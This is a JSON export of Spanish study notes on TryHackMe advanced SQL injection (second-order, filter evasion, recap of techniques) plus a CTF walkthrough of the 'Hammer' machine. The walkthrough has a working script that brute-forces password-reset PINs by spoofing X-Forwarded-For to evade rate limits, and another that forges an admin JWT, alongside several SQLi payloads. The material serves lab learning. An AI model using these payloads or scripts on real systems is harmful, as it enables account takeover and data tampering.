[
  {
    "title": "4. Filter Evasion Techniques",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/4-filter-evasion-techniques/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/4. Filter Evasion Techniques.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "En los ataques de inyección SQL avanzados, evadir filtros es crucial para explotar las vulnerabilidades exitosamente. Las aplicaciones web modernas normalmente implementan medidas defensivas para sanitizar o bloquear patrones de ataque comunes, haciendo los intentos de inyección SQL simple inefectivos. Para esto debemos adaptarnos y llevar a cabo técnicas más sofisticadas. Esta sección cubrirá estos métodos incluyendo encoding de caracteres, inyección SQL sin commillas y cómo manejar escenarios donde no podemos usar espacios.\n\n--------------------------------------\n<h2>Character Encoding</h2>\nInvolucra convertir caracteres especiales en el payload de inyección SQL en formas encodeadas que puedan sobrepasar filtros.\n\n- **URL Encoding:** El encodding URL es un método común donde los caracteres se representan usando un porcentaje seguido de su valor en hexadecimal ASCII. Por ejemplo el payload `'OR 1=1--` puede encodearse como `%27%20OR%201%3D1--`.\n- **Hexadecimal Encoding:** Es otra técnica efectiva para construir queries SQL usando valores hexadecimales. Por ejemplo, la query `SELECT * FROM users WHERE name = 'admin'` puede ser encodeada como `SELECT * FROM users WHERE name = 0x61646d696e`.\n- **Unicode Encoding:** Representa caracteres usando las secuencias de escape Unicode. Por ejemplo, la string `admin` puede ser encodeada como `\\u0061\\u0064\\u006d\\u0069\\u006e`.\n\n<h4>Ejemplo</h4>\nEn este ejemplo exploraremos cómo los desarrolladores pueden implementar filtros para prevenir los ataques de inyección SQL eliminando ciertas palabras clave y caracteres del input del usuario. También veremos cómo los atacantes pueden sobrepasarlos usando técnicas de encodeado.\n\nAquí está el código PHP (`search_books.php`) que maneja la funcionalidad de buscado.\n\n```php\n$book_name = $_GET['book_name'] ?? '';\n$special_chars = array(\"OR\", \"or\", \"AND\", \"and\" , \"UNION\", \"SELECT\");\n$book_name = str_replace($special_chars, '', $book_name);\n$sql = \"SELECT * FROM books WHERE book_name = '$book_name'\";\necho \"<p>Generated SQL Query: $sql</p>\";\n$result = $conn->query($sql) or die(\"Error: \" . $conn->error . \" (Error Code: \" . $conn->errno . \")\");\nif ($result->num_rows > 0) {\n    while ($row = $result->fetch_assoc()) {\n...\n..\n```\n\nEste es el código Javascript en el `index.html` que ofrece la interfaz para la búsqueda de libros.\n\n```javascript\nfunction searchBooks() {\nconst bookName = document.getElementById('book_name').value;\nconst xhr = new XMLHttpRequest();\nxhr.open('GET', 'search_books.php?book_name=' + encodeURIComponent(bookName), true);\n   xhr.onload = function() {\n       if (this.status === 200) {\n           document.getElementById('results').innerHTML = this.responseText;\n```\n\nEn el ejemplo de arriba, el desarrollador ha implementado un mecanismo de defensa básico para prevenir los ataques de inyección SQL eliminando palabras clave específicas como `OR`, `AND`, `UNION` y `SELECT`. El filtro usa la función `str_replace`, la cual extrae estas palabras claves del input del usuario antes de incluirlas en la query SQL. Este acercamiento de filtro busca hacer más difícil a los atacantes inyectar comandos SQL maliciosos, ya que estas palabras claves son esenciales para dichos ataques.\n\n-------------------------------------------\n<h2>Preparing the Payload</h2>\nCaminemos por el proceso de preparar un payload de inyección SQL paso a paso, mostrando cómo el encodeado URL puede sobrepasar defensas básicas. Primero, veamos qué ocurre con un input normal que contiene caracteres especiales o palabras clave SQL. \n\n![[Pasted image 20260103131048.png]]\n\nPero ¿qué pasa si tratamos de añadir `'` o `;`? Obtendremos el siguiente output.\n\n![[Pasted image 20260103131126.png]]\n\nLa query SQL no se está ejecutando correctamente lo que probablemente significa que hay una probabilidad de SQLi. Intentemos inyectar el payload `Intro to PHP' OR 1=1`.\n\n![[Pasted image 20260103131225.png]]\n\nLo que está pasando aquí es que el script PHP está usando la función `str_replace` que extrae la palabra clave `OR` y la comilla simple, resultando en un input sanitizado que no ejecutará la inyección SQL intentada. Este input es inefectivo porque el filtro elimina los componentes críticos necesarios.\n\nPara sobrepasar el filtro necesitamos encodear el input usando encodeade URL, el cual representa caracteres especiales y palabras clave en una forma en la que el filtro no reconoce ni elimina estas. Aquí está el payload de ejemplo `1%27%20||%201=1%20--+`.\n\n- `%27`:\n- `%20`: \n- `||`: \n- `%3D`: \n- `%2D%2D`:",
    "modified": "2026-01-04T01:00:46"
  },
  {
    "title": "3. Second-Order SQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/3-second-order-sql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/3. Second-Order SQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "La second-order SQLi, también conocida como SQLi stored, explota vulnerabilidades donde el input dado por el usuario es guardado y después usado en una parte diferente de la aplicación, posiblemente tras un procesado inicial. Este tipo de ataque pasa más desapercibido porque el código malicioso SQL no aparece en errores u otros sitios obvios. La inyección ocurre en el segundo uso de los datos, cuando es recuperada y usada en un comando SQL, de ahí el nombre.\n\n![[Pasted image 20251229221729.png]]\n\n---------------------------------------\n<h2>Impacto</h2>\nEl peligro de este tipo de inyección recae en su habilidad de bypassear defensas típicas del front end como validación o sanitización básica, la cual sólo ocurre en el punto inicial de introducción de información. Como no causa errores durante el primer paso, puede ser sebreseído hasta que ya es demasiado tarde, haciéndolo particularmente sigiloso.\n\n<h4>Ejemplo</h4>\nUsaremos una aplicación de reseñas de libros. La aplicación permite a los usuarios añadir nuevos libros vía una página web (`add.php`). A los usuarios se les piden los detalles sobre el libro que desean añadir a la base de datos. La información recolectada incluye `SSN`, `book_name` y `author`. Consideremos añadir un libro con los siguientes detalles: `{SSN:UI00012, book_name:Intro to PHP, author:Tim}`. Esta información se rellena mediante un formulario en la página `add.php`.\n\n![[Pasted image 20251230172642.png]]\n\nComo ya sabemos, la inyección SQL de segundo orden, es notablemente más difícil de identificar. Al contrario que la inyección SQL tradicional, la cual explota en tiempo real las vulnerabilidades, esta ocurre cuando información previamente guardada en la base de datos es usada más adelante  en una query SQL.\n\n<h4>Análisis del Código</h4>\nConsidera el código PHP usado en nuestra aplicación para añadir libros:\n\n```php\nif (isset($_POST['submit'])) {\n\n    $ssn = $conn->real_escape_string($_POST['ssn']);\n\n    $book_name = $conn->real_escape_string($_POST['book_name']);\n\n    $author = $conn->real_escape_string($_POST['author']);\n\n    $sql = \"INSERT INTO books (ssn, book_name, author) VALUES ('$ssn', '$book_name', '$author')\";\n\n    if ($conn->query($sql) === TRUE) {\n\n        echo \"<p class='text-green-500'>New book added successfully</p>\";\n\n    } else {\n\n        echo \"<p class='text-red-500'>Error: \" . $conn->error . \"</p>\";\n\n    }\n\n}\n```\n\nEl código usa el método `real_escape_string()` para escapar caracteres especiales en el input. Aunque este método puede mitigar algunos riesgos de la inyección SQL inmediata, no securiza la aplicación frente a second-order SQLi. El problema clave es la falta de queries parametrizadas lo que es esencial para prevenir ataques de SQLi. Cuando se inserta la información usando este método se pueden incluires caracteres que no causan daño inmediato, pero que de ser metidos en una query secuencial pueden resultar en inyección de segundo orden como `Intro to PHP'; DROP TABLE books;--`.\n\nProbemos a añadir un libro con el SSN `test'`.\n\n![[Pasted image 20251230173850.png]]\n\nEl SSN `test'` fue insertado exitosamente en la base de datos. La aplicación incluye una funcionalidad para actualizar detalles de un libro a través de una interfaz como `update.php`. Esta interfaz puede mostrar detalles de libros existentes en campos de formulario. El pentester investigará si la aplicación reutiliza información como `book_name`. Entonces contruiríamos las queries SQL para actualizar registros usando la información manipulada sin sanitización. Manipulando la funcionalidad de actualización, el tester puede ver si el payload malicioso añadido se ejecuta durante la operación de actualización. Si la aplicación no consigue filtrar estos caracteres o emplear buenas prácticas de seguridad, el payload `'; DROP TABLE books; --` podría activarse llevando a la ejecución de un comando SQL malicioso. \n\n![[Pasted image 20251231132601.png]]\n\nRevisemos ahora el código de `update.php`. Este script permite a los usuarios actualizar detalles de libros en la base de datos de BookStore. A través de la estructura query, analizaremos un escenario típico donde un pentester pueda buscar vulnerabilidades SQLi, especialmente centrándonos en cómo el input se maneja y utiliza en queries SQL.\n\n```php\nif ( isset($_POST['update'])) {\n    $unique_id = $_POST['update'];\n    $ssn = $_POST['ssn_' . $unique_id];\n    $new_book_name = $_POST['new_book_name_' . $unique_id];\n    $new_author = $_POST['new_author_' . $unique_id];\n\n    $update_sql = \"UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');\";\n..\n...\n```\n\nEl script comienza comprobando si el método de petición es POST y si el botón \"Update\" ha sido presionado, indicando que el usuario pretende actualizar los detalles del libro. Siguiendo esto, el script recupera el input del usuario directamente de la información POST.\n\n```php\n$unique_id = $_POST['update'];\n$ssn = $_POST['ssn_' . $unique_id];\n$new_book_name = $_POST['new_book_name_' . $unique_id];\n$new_author = $_POST['new_author_' . $unique_id];\n```\n\nEstas variables son usadas para construir más tarde una query SQL para actualizar los detalles del libro especificado en la base de datos:\n\n```php\n$update_sql = \"UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');\";\n```\n\nEl script usa `multi_query` para ejecutar múltiples queries. \n\n---------------------------------\n<h2>Preparando el Payload</h2>\nSabemos que podemos añadir o modificar los detalles del libro basado en su `ssn`. La query normal para actualizar un libro podría verse así:\n\n```sql\nUPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';\n```\n\nSin embargo, el comando SQL podría ser manipulado si un atacante inserta un valor `ssn` construído por él. Por ejemplo, si el atacante usa el valor `ssn`:\n\n```sql\n12345'; UPDATE books SET book_name = 'Hacked'; --\n```\n\nCuando este valor es usado en la query de actualización, finaliza el comando UPDATE después de `12345` y comienza otro nuevo comando. Esto cambiaría el `book_name` de todas las entradas de la tabla books a **Hacked**.\n\n<h4>Hagamos lo Siguiente</h4>\n1. **Inserción inicial de Payload:** Un nuevo libro es añadido con el payload `12345'; UPDATE books SET book_name = 'Hacked'; --` se inserta en `ssn`. El `;` se usa para terminar el statement SQL actual.\n   \n   ![[Pasted image 20260102124240.png]]\n   \n2. **Ejecución SQL Maliciosa:** Después de eso cuando el admin o cualquier otro usuario visita la URL `update.php`  y lo actualiza, el payload insertado rompe la estructura del comando SQL e inyecta un comando nuevo que actualiza todos los nombres de libros de la tabla books.\n   \n```sql\nUPDATE books SET book_name = 'Testing', author = 'Hacker' WHERE ssn = '12345'; Update books set book_name =\"hacked\"; --'; INSERT INTO logs (page) VALUES ('update.php');\n```\n   \n3. **Comentar el resto:** El doble guión `--`, es un símbolo de comentario de SQL. Cualquier cosa que siga a `--` será ignorado por el servidor SQL, neutralizando efectivamente cualquier resto del statement SQL original que pudiera causar errores o revelar el ataque. Una vez se ejecuta el payload de arriba se cambian todos los nombres como se muestra.\n   \n   ![[Pasted image 20260102125009.png]]",
    "modified": "2026-01-03T00:51:34"
  },
  {
    "title": "2. Quick Recap",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/2-quick-recap/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/2. Quick Recap.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "En la última unidad de SQLi, exploramos los fundamentos de SQLi, entendiendo cómom los atacantes explotan vulnerabilidades en las aplicaciones web para manipular queries SQL y acceder a información no autorizada. Cubrimos técnicas esenciales como la SQLi basada en error o en unión, métodos de blind SQLi como la basada en booleanos o en tiempo. Aquí un repaso rápido de lo que ya sabemos:\n\n![[Pasted image 20251229135548.png]]\n\n----------------------------------------\n<h2>In-band SQL Injection</h2>\nEsta técnica está considerada una de las más comunes y directas de inyección SQL. En esta técnica el atacante usa el mismo canal de comunicación para tanto la inyección y recuperación de información. Hay dos tipos principales de inyección SQL in-band.\n\n- **Error-Based SQL Injection:** El atacante manipula la query SQL para producir mensajes de error de la base de datos. Estos mensajes de error suelen contener información sobre la estructura de la base de datos, lo que puede usarse para explotar la base de datos. Ejemplo: `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`. Si la versión de la base de datos es devuelta en el mensaje de error, revela información sobre esta.\n- **Union-Based SQL Injection:** El atacante usa el operador SQL UNION para combinar los resultados de dos o más statements SELECT en un solo resultado, recuperando así información de otras tablas. Ejemplo: `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin`.\n\n--------------------------------------------\n<h2>Inferential (Blind) SQL Injection</h2>\nLa inyección SQL inferencial no transfiere la información directamente a través de la aplicación web, haciendo explotarla más difícil. En su lugar, el atacante manda payloads y observa el comportamiento de la aplicación y tiempos de respuesta para inferir información sobre la base de datos. Hay dos tipos principales de inyección SQL inferencial:\n\n- **Boolean-Based Blind SQL Injection:** El atacante manda una query SQL a la base de datos, forzando la aplicación a que devuelva un resultado diferente basado en una condición true o false. Analizando la respuesta de la aplicación, el atacante puede inferir si el payload era cierto o no. Ejemplo: `SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)`.\n- **Time-Based Blind SQL Injection:** El atacante manda una query SQL a la base de datos que retrasa la respuesta por un periodo de tiempo específico si la condición es cierta. Midiendo el tiempo de respuesta, el atacante puede inferir si la condición es cierta o no. Ejemplo: `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`.\n\n--------------------------\n<h2>Out-of-band SQL Injection</h2>\nOut-of-band SQL Injection es usada cuando el atacante no puede usar el mismo canal para lanzar el ataque y reunir resultados o cuando las respuestas del servidor son inestables. Esta técnica se basa en que el servidor de base de datos haga una petición out-of-band para mandar los resultados de la query al atacante. HTTP es normalmente usado en la inyección SQL out-of-band para mandar el resultado de la query al servidor del atacante.\n\nCada tipo de técnica de inyección SQL tiene sus ventajas y retos.Entender estas técnicas es crucial para identificar y mitigar vulnerabilidades de injección SQL en las aplicaciones web. La inyección SQL in-band, es fácil de explotar y detectar pero ruidosa y fácilmente monitorizable. La inyección SQL inferencial es más difícil de explotar y requiere múltiples peticiones pero puede ser usada cuando los mensajes detallados de error no están disponibles. La inyección SQL out-of-band es menos común y altamente efectiva, requiere un servidor de control externo y se basa en la habilidad de la base de datos de hacer peticiones out-of-band. Controlando estas técnicas, los pentesters pueden identificar eficientemente vulnerabilidades de inyección SQL, ayudando a las organizaciones a securizar sus aplicaciones web contra amenazas.",
    "modified": "2025-12-30T00:53:49"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "Sigue siendo una de las vulnerabilidades más severas y expandidas. Ocurre cuando un atacante consigue explotar una aplicación web y ganar la habilidad de ejecutar queries SQL arbitrarias llevando a acceso no autorizado a la base de datos, exfiltración de información, manipulación de datos o incluso control total sobre la aplicación. En esta unidad veremos técnicas avanzadas de inyección SQL, entendiendo vectores de ataque sofisticados, así como estrategias de mitigación.\n\n------------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nA lo largo de esta unidad, ganaremos un entendimiento profundo de los siguientes conceptos clave:\n\n- Second-order SQL Injection.\n- Evasión de Filtros.\n- Out-of-band SQL Injection.\n- Técnicas de Automatización.\n- Medidas de Mitigación.\n\n------------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/0. SQL Injection]]\n- [[0. SQLMap - The Basics]]\n- [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]\n- [[0. Nmap - The Basics]]\n\n-------------------------------\n<h2>Conectarse a la Máquina</h2>\nConéctate como normalmente lo haces. Antes de seguir, es clave entender qué versión de base de datos tiene así como detalles del sistema operativo. Para ello, podemos usar Nmap.\n\n```bash\nthm@machine$ nmap -A -T4 -p 3306,3389,445,139,135 MACHINE_IP\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2024-05-25 12:03 BST\nNmap scan report for MACHINE_IP\nHost is up (0.00034s latency).\n\nPORT     STATE    SERVICE       VERSION\n135/tcp  open     msrpc\n139/tcp  open     netbios-ssn\n445/tcp  open     microsoft-ds\n3306/tcp open     mysql\n3389/tcp open     ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=SQLi\n| Not valid before: 2024-05-23T04:08:44\n|_Not valid after:  2024-11-22T04:08:44\n|_ssl-date: 2024-05-25T11:03:33+00:00; 0s from scanner time.\nMAC Address: 02:87:BD:21:12:33 (Unknown)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: specialized\nRunning (JUST GUESSING): AVtech embedded (87%)\nAggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.67 seconds\n```\n\nEsta máquina usa MySQL en Windows.",
    "modified": "2025-12-29T00:58:28"
  },
  {
    "title": "2. Getting the Flags",
    "path": "/apuntes/thm/maquinas/2-medium/6-hammer/2-getting-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/2. Getting the Flags.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 6. Hammer",
    "content": "1. Empezaremos con el reconocimiento (aunque ya sabemos por donde va a tirar, seguramente algo de MFA).\n\t1. Escaneo de puertos.\n\t   ![[Pasted image 20251226045221.png]]\n\t   Miramos a ver qué es el servicio waste.\n\t   ![[Pasted image 20251226045350.png]]\n\t2. Escaneo de puertos en profundidad.\n\t   ![[Pasted image 20251226045429.png]]\n\t   Como el puerto 80 no está abierto, no tiene sentido escanear directorios ni subdominios.\n2. Si vamos al puerto `1337` encontramos no que parece un endpoint de login.\n   ![[Pasted image 20251226045730.png]]\n3. Si miramos el código fuente podemos ver la convención de nombramiento de directorios.\n   ![[Pasted image 20251226045828.png]]\n   Si intentamos hacer fuzzeo de directorios a este tipo de dirección:\n   ![[Pasted image 20251226050658.png]]\n4. Si le damos al único archivo aparentemente interesante, `reset_password.php`, podemos ver el código de flujo del reseteo de contraseñas.\n   ![[Pasted image 20251226050007.png]]\n   Parece que hay una cuenta atrás en la que tienes que introducir el código.\n5. Si revisamos los directorios que encontramos fuzzeando antes, sólo hay dos que parecen poder tener algo interesante.\n\t1. El primero y más interesante es `/hmr_logs/`, el cual contiene logs de error de conexión en los que se detallan usuarios, endpoints, hostnames, etc.\n\t   ![[Pasted image 20251226051220.png]]\n\t2. El segundo, y algo menos llamativo es `/hmr_images`, en donde hay una imagen de un taller con martillo.\n\t   ![[Pasted image 20251226051304.png]]\n\t   No hay nada en la imagen, por lo que definitivamente seguiremos por el otro lado.\n\t   ![[Pasted image 20251226051450.png]]\n6. Vamos a investigar bien los logs que hemos encontrado.\n   ![[Pasted image 20251226052104.png]]\n\t1. Lo más llamativo a simple vista es que parece que tenemos un usuario: `tester@hammer.thm`.\n\t2. Además podemos ver la página a la que aparentemente querríamos poder acceder: `/restricted-area`.\n\t3. Vemos un posible hostname del sistema que nos puede servir más adelante para forzar la entrada por ssh: `hammerthm`.\n\t4. Vemos que hay un login de administrador: `/admin-login`.\n\t5. Parece que hay un límite de 10 peticiones, pero no sabemos en qué se basa para filtrar, todavía.\n7. Con todo esto en mente vamos a investigar las respuestas del servidor con BurpSuite.\n\t1. Para usuario y contraseñas erróneos:\n\t\t1. Manda usuario y contraseña por POST.\n\t\t   ![[Pasted image 20251226052659.png]]\n\t\t2. En la respuesta recibimos \"Invalid Email or Password\".\n\t\t   ![[Pasted image 20251226052821.png]]\n\t2. Para usuario correcto y contraseña errónea:\n\t\t1. La petición inicial sigue siendo igual pero con diferentes credenciales.\n\t\t   ![[Pasted image 20251226052934.png]]\n\t\t2. La respuesta también es igual.\n\t\t   ![[Pasted image 20251226053050.png]]\n8. Vamos a ver qué pasa si le damos a \"Forgot your password?\".\n\t1. Esta petición ya parece más interesante.\n\t   ![[Pasted image 20251226053711.png]]\n\t   Está llamando al endpoint `/reset_password.php`.\n\t2. Si dejamos pasar las peticiones y metemos el email, obtenemos una página con un contador.\n\t   ![[Pasted image 20251226053918.png]]\n\t3. Si introducimos un código que no es no nos saca directamente.\n\t   ![[Pasted image 20251226054009.png]]\n\t4. Si lo introducimos mal unas cuantas veces pone:\n\t   ![[Pasted image 20251226060052.png]]\n9. Ejecutaremos el siguiente código.\n   \n```python\nimport requests\nimport sys\nimport random\nfrom concurrent.futures import ThreadPoolExecutor\n\n# Configuración\nIP = \"IP\" #Cambia esto\nbase_url = f'http://{IP}:1337'\nurl = f'{base_url}/reset_password.php'\nemail = 'tester@hammer.thm'\nMAX_THREADS = 10\n\nexito = False\n\ndef get_new_session():\n    s = requests.Session()\n    try:\n        s.post(url, data={'email': email}, timeout=10)\n        if 'PHPSESSID' in s.cookies:\n            return s\n    except:\n        return None\n    return None\n\ndef batch_worker(start_pin):\n    global exito\n    if exito: return\n\n    session = get_new_session()\n    if not session: return\n\n    for i in range(7):\n        current_pin = start_pin + i\n        if current_pin > 9999 or exito: break\n        \n        pin_str = f\"{current_pin:04d}\"\n        headers = {\n            'X-Forwarded-For': f\"127.0.0.{random.randint(1,254)}\",\n            'Content-Type': 'application/x-www-form-urlencoded'\n        }\n        data = {'recovery_code': pin_str, 's': '180'}\n\n        try:\n            # Importante: allow_redirects=True para seguir a la página de nueva password\n            resp = session.post(url, data=data, headers=headers, allow_redirects=True, timeout=10)\n\n            if \"Invalid or expired\" not in resp.text and \"Rate limit\" not in resp.text:\n                exito = True\n                print(f\"\\n\\n[!] ¡ÉXITO! PIN CONFIRMADO: {pin_str}\")\n                print(f\"[+] PHPSESSID: {session.cookies.get('PHPSESSID')}\")\n                print(f\"[+] URL FINAL: {resp.url}\")\n                \n                # Guardamos la página para que la veas\n                with open(\"exito.html\", \"w\") as f:\n                    f.write(resp.text)\n                print(f\"[+] Contenido guardado en 'exito.html'. Ábrelo con tu navegador.\")\n                return\n\n            sys.stdout.write(f\"\\r[*] Intentando: {pin_str} \")\n            sys.stdout.flush()\n        except:\n            pass\n\ndef main():\n    pines_iniciales = [i for i in range(0, 10000, 7)]\n    # Como ya sabemos que es el 1013, el script llegará rápido.\n    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:\n        executor.map(batch_worker, pines_iniciales)\n\nif __name__ == \"__main__\":\n    main()\n   ```\n   \n   Obtenemos lo siguiente:\n   ![[Pasted image 20251226063426.png]]\n\n10. Si metemos dicha cookie y OTP:\n    ![[Pasted image 20251226063621.png]]\n11. Si cambiamos la contraseña e iniciamos sesión:\n    ![[Pasted image 20251226063708.png]]\n    Hemos encontrado la flag del dashboard, nos queda la del sistema.\n12. Si probamos con ls vemos que hay un archivo `.php` de ejecución de comandos.\n    ![[Pasted image 20251227214535.png]]\n13. Parece ser que hay un elemento que nos echa de la sesión. Si miramos el código fuente:\n    ![[Pasted image 20251227215423.png]]\n    Podemos ver que si el valor `persistentCookie` no está en true nos echará todo el rato.\n14. Vamos a interceptar una petición de ejecución de comandos con Burp Suite.\n    ![[Pasted image 20251227220212.png]]\n    Vemos que hay un archivo `.key`.\n15. Vamos a analizar el JWT con `jwt.io`.\n    ![[Pasted image 20251227220459.png]]\n16. Como tenemos acceso podemos listar el secreto `188ade1.key`.\n    ![[Pasted image 20251227220723.png]]\n17. Vamos a usar un script de python para generar el JWT.\n    \n```python\nimport jwt\n\n# The secret key from /var/www/mykey.key\nsecret_key = \"56058354efb3daa97ebab00fabd7a7d7\"\n\n# JWT header including 'kid'\nheader = {\n    \"typ\": \"JWT\",\n    \"alg\": \"HS256\",\n    \"kid\": \"/var/www/html/188ade1.key\"\n}\n\n# Payload with the 'admin' role\npayload = {\n    \"iss\": \"http://hammer.thm\",\n    \"aud\": \"http://hammer.thm\",\n    \"iat\": TiempoDeCreación,\n    \"exp\": TiempoDeExpiración (poner más alto),\n    \"data\": {\n        \"user_id\": 1,\n        \"email\": \"tester@hammer.thm\",\n        \"role\": \"admin\"\n    }\n}\n\n# Encode the JWT with the specific header\ntoken = jwt.encode(payload, secret_key, algorithm=\"HS256\", headers=header)\n\n# Print the generated token\nprint(token)\n```\n\n18. Lo ejecutamos y obtenemos el JWT.\n    ![[Pasted image 20251227221145.png]]\n19. Metemos dicho token en el header authorization bearer y en el valor y ejecutamos un comando para leer `/home/ubuntu/flag.txt`.\n    \n    ![[Pasted image 20251227222238.png]]\n\n>[!CAUTION] Lee los scripts usados antes de utilizarlos para entender cómo funcionan y qué cosas debes cambiar.\n\n>[!SUCCESS] Hemos conseguido obtener ambar flags. También podríamos haber obtenido una reverse shell del sistema en nuestra máquina pero no era necesario para el propósito de la máquina.",
    "modified": "2025-12-28T01:00:21"
  }
]